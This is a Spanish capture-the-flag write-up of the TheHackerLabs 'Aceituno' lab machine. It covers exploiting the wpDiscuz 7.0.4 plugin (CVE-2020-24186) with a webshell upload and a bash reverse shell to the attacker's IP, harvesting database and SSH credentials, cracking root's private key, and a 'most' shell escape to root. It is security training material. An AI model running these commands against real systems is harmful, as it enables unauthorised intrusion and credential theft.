---
title: "Aceituno - TheHackerLabs"
date: 2025-04-01
draft: false
slug: "THL-writeup-aceituno"
excerpt: "Esta fue una máquina un poco complicada. Analizando los escaneos de servicios, encontramos que el puerto 80 está utilizando WordPress y que está expuesto el puerto 3306 del servicio MySQL. Después de analizar la página web, utilizamos la herramienta wpscan y el módulo wordpress_scanner de Metasploit Framework para buscar plugins vulnerables, siendo así que encontramos el plugin wpDiscuz que explotamos para ganar acceso a la máquina víctima. Una vez dentro, buscamos el archivo config.php para ver las credenciales de acceso al servicio MySQL. Logrando entrar al MySQL, enumeramos la base de datos de WordPress, encontrando una tabla que contiene las credenciales de acceso de un usuario para el servicio SSH. Dentro del SSH, vemos que podemos usar el binario most con privilegios de Root, siendo de esta manera que logramos copiar su llave privada, la crackeamos y nos logueamos como Root. Además, probamos que es posible aplicarle Shell Escape a este binario, siendo otra forma de escalar privilegios."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "WordPress", "Plugin wpDiscuz 7.0.4", "Web Enumeration", "WordPress Enumeration", "WordPress Plugin Vulnerability", "CVE-2020-24186 (Unauthenticated RCE)", "Local File Enumeration (WordPress)", "MySQL Enumeration", "Abusing Sudoers Privileges", "Privilege Abuse of Binaries to Access Sensitive Files (Binary most)", "Cracking Hash", "Cracking SSH Private Key", "Applying Shell Escape", "Privesc - Privilege Abuse of Binaries to Access Sensitive Files (Binary most)", "Privesc - Applying Shell Escape", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wpscan"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/wordpress_scanner"
  - "searchsploit"
  - "python"
  - "nc"
  - "bash"
  - "Módulo: exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload"
  - "find"
  - "mysql"
  - "ssh"
  - "sudo"
  - "ssh2john"
  - "JohnTheRipper"
  - "chmod"
links:
  - "https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce"
  - "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress#wordpress"
  - "https://stackoverflow.com/questions/22285318/how-to-unblock-with-mysqladmin-flush-hosts"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-aceituno/aceituno.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.220
PING 192.168.1.220 (192.168.1.220) 56(84) bytes of data.
64 bytes from 192.168.1.220: icmp_seq=1 ttl=64 time=5.77 ms
64 bytes from 192.168.1.220: icmp_seq=2 ttl=64 time=0.842 ms
64 bytes from 192.168.1.220: icmp_seq=3 ttl=64 time=0.837 ms
64 bytes from 192.168.1.220: icmp_seq=4 ttl=64 time=0.818 ms

--- 192.168.1.220 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3067ms
rtt min/avg/max/mdev = 0.818/2.067/5.771/2.138 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.220 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 11:19 CST
Initiating ARP Ping Scan at 11:19
Scanning 192.168.1.220 [1 port]
Completed ARP Ping Scan at 11:19, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:19
Scanning 192.168.1.220 [65535 ports]
Discovered open port 80/tcp on 192.168.1.220
Discovered open port 3306/tcp on 192.1681.220
Discovered open port 22/tcp on 192.168.1.220
Discovered open port 443/tcp on 192.168.1.220
Completed SYN Stealth Scan at 11:20, 18.08s elapsed (65535 total ports)
Nmap scan report for 192.168.1.220
Host is up, received arp-response (0.00065s latency).
Scanned at 2025-04-01 11:19:53 CST for 18s
Not shown: 64538 closed tcp ports (reset), 993 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.35 seconds
           Raw packets sent: 81460 (3.584MB) | Rcvd: 64543 (2.582MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 4 puertos abiertos, pero me da curiosidad ver expuesto el **puerto 3306**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,443,3306 192.168.1.220 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 11:21 CST
Nmap scan report for 192.168.1.220
Host is up (0.00067s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 0f:7d:a0:9a:ad:8f:f6:85:fc:69:f4:43:53:72:3b:b1 (ECDSA)
|_  256 0a:02:48:06:90:21:90:15:e6:7d:09:83:63:a2:bd:19 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-generator: WordPress 6.5.2
|_http-server-header: Apache/2.4.59 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
443/tcp  open  http    Apache httpd 2.4.59

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp open  mysql   MariaDB 5.5.5-10.11.6

| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 33
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, Speaks41ProtocolOld, LongColumnFlag, FoundRows, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: TA'@I2ZRjBG{Y,kWU#J0
|_  Auth Plugin Name: mysql_native_password
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web del **puerto 80** muestra que está utilizando **WordPress 6.5.2**, mientras que la página web del **puerto 443** solo muestra la página por defecto de **Apache2**. Además, tenemos información sobre el **puerto 3306** que no es normal que esté expuesto.

Vamos a ver la página del **puerto 80** primero.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura1.png">
</p>

No me carga bien la página.

Y es que haciendo un poco de **hovering**, podemos ver que hay un dominio que podemos registrar en el `/etc/hosts`:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura2.png">
</p>

Una vez que lo registres, recarga la página y ya debería verse bien:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura3.png">
</p>

Ahora sí, se ve bien y, como vimos en el escaneo, es una página hecha con **WordPress**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura4.png">
</p>

Hay muchas tecnologías, quizá podamos aprovecharnos de la versión de **WordPress**.

Y si bajamos un poco, podemos ver una publicación de un usuario llamado **Aceituno**:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura5.png">
</p>

Bien, de ahí en fuera, no veo algo más que nos pueda ayudar.

Vamos a probar si es que existe algún plugin vulnerable del que nos podamos aprovechar.

### Escaneando Página Web de WordPress con wpscan y Módulo wordpress_scanner de Metasploit Framework {#wpscan}

Primero, vamos a buscar usuarios y plugins vulnerables con la herramienta **wpscan**:
```bash
wpscan --url http://192.168.1.220 --enumerate u,vp --plugins-detection aggressive --no-banner
[+] URL: http://192.168.1.220/ [192.168.1.220]
[+] Started: Tue Apr  1 12:09:20 2025

Interesting Finding(s):
...

[+] robots.txt found: http://192.168.1.220/robots.txt

 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.220/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.220/readme.html

 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:50 <========================================> (7343 / 7343) 100.00% Time: 00:01:50
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] aceituno

 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.1.220/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Aceituno

 | Found By: Rss Generator (Aggressive Detection)
...
```

| Parámetros | Descripción |
|---|---|
| *--url*    | Para indicar la URL a escanear. |
| *--enumerate* | Indicando que aplique enumeración, puede ser de usuarios (`u`), de plugins vulnerables (`vp`), etc. |
| *--plugins-detection* | Para indicar un modo de detección de plugins, se puede elegir entre `passive` (pasivo), `mixed` (mixto) y `agressive` (agresivo). |

Pudo identificar algunas cosillas, pero nada que nos ayude.

Quizá el módulo **wordpress_scanner** de **Metasploit** nos muestre algo.

Vamos a usarlo:

* Inicia **Metasploit Framework** y usa el módulo `auxiliary/scanner/http/wordpress_scanner`:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) >
```

* Configúralo:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.220
RHOSTS => 192.168.1.220
```

* Y úsalo:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit
[*] Trying 192.168.1.220
[+] 192.168.1.220 - Detected Wordpress 6.5.2
[*] 192.168.1.220 - Enumerating Themes
[*] 192.168.1.220 - Progress  0/3 (0.0%)
[*] 192.168.1.220 - Finished scanning themes
[*] 192.168.1.220 - Enumerating plugins
[*] 192.168.1.220 - Progress   0/70 (0.0%)
[+] 192.168.1.220 - Detected plugin: wpdiscuz version 7.0.4
[*] 192.168.1.220 - Finished scanning plugins
[*] 192.168.1.220 - Searching Users
[+] 192.168.1.220 - Detected user: Aceituno with username: aceituno
[*] 192.168.1.220 - Finished scanning users
[*] 192.168.1.220 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Observa que pudo identificar el **plugin wpdiscuz**, que, si no mal recuerdo, ya lo hemos explotado en la **máquina Mortadela**.

Podemos buscar este plugin con **searchsploit** y encontraremos 3 Exploits, de los cuales 2 sí funcionan, siendo el Exploit hecho en **Bash** el que no funciona:
```bash
searchsploit wpdiscuz 7.0.4
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                                                   | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                                                   | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                                        | php/webapps/49401.rb

|---|---|
Shellcodes: No Results
```
Vamos a probar esos dos.

Antes de continuar, si revisamos el código fuente de la publicación que vimos antes, podremos ver que ahí se está utilizando el **plugin wpdiscuz**:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura11.png">
</p>

Por lo que es una buena idea revisar el código fuente de las publicaciones, pues ahí es posible que podamos encontrar plugins.

Ahora sí, continuemos.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated) {#Exploit}

Este Exploit, aprovecha una vulnerabilidad en el **plugin wpdiscuz 7.0.4** que permite subir archivos, siendo que carga una webshell con la que podemos ejecutar comandos.

Aquí te dejo una PoC que realizó **INE Security**:
* <a href="https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce" target="_blank">Vulnerability Lab: WordPress Plugin wpDiscuz Unauthenticated RCE</a>

Vamos a copiarnos este Exploit en nuestro directorio de trabajo:
```bash
searchsploit -m php/webapps/49967.py
  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/49967
     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
    Codes: CVE-2020-24186
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)
```

Podemos ver su forma de uso:
```bash
python 49967.py
[+] Specify an url target
[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
[+] Example help usage: exploit.py -h
```

Usémoslo como lo indica:
```bash
python 49967.py -u http://192.168.1.220 -p /2024/04/23/hola-mundo/
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[97783] | code:[200]
[!] Got wmuSecurity value: 50d62fd2c8
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: miszhlqxzlgxwtf

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://aceituno.thl/wp-content/uploads/2025/04/miszhlqxzlgxwtf-1743533506.9218.php&quot;
```
Recuerda que no funciona la ejecución remota desde el Exploit en nuestra terminal, pero la webshell sí fue cargada.

Podemos visitarla y probar un comando:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura6.png">
</p>

Excelente, funciona.

Ahora, podemos mandarnos una **Reverse Shell** para obtener una sesión.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell** en la **webshell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura7.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.220] 55338
bash: cannot set terminal process group (516): Inappropriate ioctl for device
bash: no job control in this shell

www-data@Aceituno:/var/www/html/wordpress/wp-content/uploads/2025/04$ whoami
whoami
www-data
```
Estamos dentro.

Recuerda obtener una sesión interactiva porque la necesitaremos más adelante.

### Probando Módulo de Metasploit Framework: wp_wpdiscuz_unauthenticated_file_upload {#Exploit2}

Existe un módulo de **Metasploit Framework** que se aprovecha esta vulnerabilidad.

Vamos a buscarlo y a usarlo:
```bash
msf6 auxiliary(scanner/http/wordpress_scanner) > search wpdiscuz
.
Matching Modules
================
.
   #  Name                                                         Disclosure Date  Rank       Check  Description
   -  ----                                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload  2020-02-21       excellent  Yes    WordPress wpDiscuz Unauthenticated File Upload Vulnerability
.
msf6 auxiliary(scanner/http/wordpress_scanner) > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) >
```

Configuralo:
```bash
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set RHOSTS 192.168.1.220
RHOSTS => 192.168.1.220
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set BLOGPATH /2024/04/23/hola-mundo/
BLOGPATH => /2024/04/23/hola-mundo/
```

Y ejecútalo:
```bash
msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[+] Payload uploaded as GHXZu.php
[*] Calling payload...
[*] Sending stage (40004 bytes) to 192.168.1.220
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.220:56358) at 2025-04-01 12:56:17 -0600
[!] This exploit may require manual cleanup of 'GHXZu.php' on the target

meterpreter > getuid
Server username: www-data
```
Muy bien, estamos dentro.

## Post Explotación {#Post}

### Enumeración de Servicio MySQL {#MySQL}

Si recordamos el escaneo, habíamos encontrado que está activo el **servicio MySQL**.

Existe un archivo que contiene el usuario y contraseña de la base de datos de **WordPress**. Este archivo se llama **wp-config.php**.

Vamos a buscarlo:
```bash
www-data@Aceituno:/var/www/html/wordpress$ find /var/www/ -type f -name "wp-config.php"
/var/www/html/wordpress/wp-config.php
```

Si lo leemos, ahí estarán las credenciales de acceso al **servicio MySQL** para ver la base de datos de **WordPress**:
```bash
www-data@Aceituno:/var/www/html/wordpress$ cat /var/www/html/wordpress/wp-config.php
<?php
/**
 * The base configuration for WordPress
...
...
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'Tomamoreno' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
...
```

Intentemos entrar a **MySQL**:
```bash
www-data@Aceituno:/var/www/html/wordpress$ mysql -u wp_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 115087
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```
Bien, pudimos entrar.

Veamos qué bases de datos hay:
```bash
MariaDB [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)
```

Solo está la de **WordPress**, así que veamos su contenido:
```bash
MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
.
Database changed
MariaDB [wordpress]> show tables;
+-----------------------------+

| Tables_in_wordpress         |
+-----------------------------+

| pelopicopata                |
| wp_commentmeta              |
| wp_comments                 |
| wp_gwolle_gb_entries        |
| wp_gwolle_gb_log            |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
22 rows in set (0.000 sec)
```
Hay una tabla extraña que parece que fue creada por un usuario.

Veamos su contenido:
```bash
MariaDB [wordpress]> select * from pelopicopata;
+----------+------------------+

| usuario  | contrase�a       |
+----------+------------------+

| aceituno | XXXXXXXXXXXXXXXX |
+----------+------------------+
1 row in set (0.000 sec)
```
Quiero pensar que son las credenciales de acceso para el **servicio SSH**.

Probémoslo:
```bash
ssh aceituno@192.168.1.220
aceituno@192.168.1.220's password: 
Linux Aceituno 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
...
...
Last login: Tue Apr  1 22:24:36 2025
aceituno@Aceituno:~$
```

Genial, estamos dentro y aquí podremos encontrar la flag del usuario:
```bash
aceituno@Aceituno:~$ ls
user.txt
aceituno@Aceituno:~$ cat user.txt
...
```

### Escalando Privilegios con Binario most {#most}

Veamos qué privilegios tiene nuestro usuario:
```bash
aceituno@Aceituno:~$ sudo -l
Matching Defaults entries for aceituno on Aceituno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User aceituno may run the following commands on Aceituno:
    (root) NOPASSWD: /usr/bin/most
```
Podemos usar el **binario most**, pero desconozco este binario.

| **Binario most** |
|:-----------:|
| *most es un pager de línea de comandos en Linux y Unix, similar a more o less, que se usa para ver archivos de texto de forma paginada en la terminal. A diferencia de less, puede dividir la pantalla en varias secciones para visualizar diferentes partes de un archivo al mismo tiempo. Soporta colores y resaltado de sintaxis en algunos casos.* |

Entonces, podemos usarlo para ver archivos y cómo lo podemos usar como **Root**, quizá podamos ver si tiene una llave privada para poder robarla.

Ejecutémoslo para ver qué nos dice:
```bash
aceituno@Aceituno:~$ sudo /usr/bin/most
MOST version 5.0.0 (S-Lang version 2.3.3)
 *Note: This executable was compiled against S-Lang 2.3.2
Usage:
most [-1Cbcdkstvw] [+/string] [+line number] [+s] [+d] file...
 where: -1:  assume VT100 terminal. (VMS only)
        -b:  Startup in binary mode.
        -C:  disable color support
...
```

De acuerdo con **ChatGPT**, tan solo hay que indicar la ruta del archivo a ver, así que tratemos de ver la llave privada del **Root**:
```bash
aceituno@Aceituno:~$ sudo /usr/bin/most /root/.ssh/id_rsa
```

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura8.png">
</p>

Excelente, la podemos ver.

Vamos a copiarla y a guardarla para poder crackearla.

Una vez que lo hagas, usaremos **ssh2john** para obtener el hash:
```bash
ssh2john id_rsa > hash
```

Y lo crackeamos con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*********         (id_rsa)     
1g 0:00:00:57 DONE (2025-04-01 14:37) 0.01740g/s 35.49p/s 35.49c/s 35.49C/s blessed1..paris
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Bien, tenemos la frase de esta llave privada.

Usémosla para poder loguearnos como **Root**:
```bash
chmod 600 id_rsa
.
ssh -i id_rsa root@192.168.1.220
Enter passphrase for key 'id_rsa': 
Linux Aceituno 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64
...
Last login: Sun Apr 28 12:08:02 2024
root@Aceituno:~# 
root@Aceituno:~# whoami
root
```
Ya somos **Root**.

Y ya solo obtengamos la última flag:
```bash
root@Aceituno:~# ls
root.txt
root@Aceituno:~# cat root.txt
...
```
Con esto terminamos la máquina.

### Aplicando Shell Escape al Binario most para Escalar Privilegios {#shellEscape}

Al ver cómo funciona el **binario most**, se parece a como si entraramos en el manual.

Y si presionamos la tecla H, podemos ver varias opciones para trabajar y entre ellas está la siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura9.png">
</p>

Podemos editar el archivo que queramos.

Al editarlo, es cuando podemos aplicar el **Shell Escape**, pues probar a inyectar comandos para obtener una shell.

Probémoslo, presiona **shift + E**, luego escribe lo siguiente:
```bash
:!/bin/bash
```

Y observa lo que ocurre:

<p align="center">
<img src="/assets/images/THL-writeup-aceituno/Captura10.png">
</p>

```bash
root@Aceituno:/home/aceituno# whoami
root
```

Escalamos privilegios de nuevo.
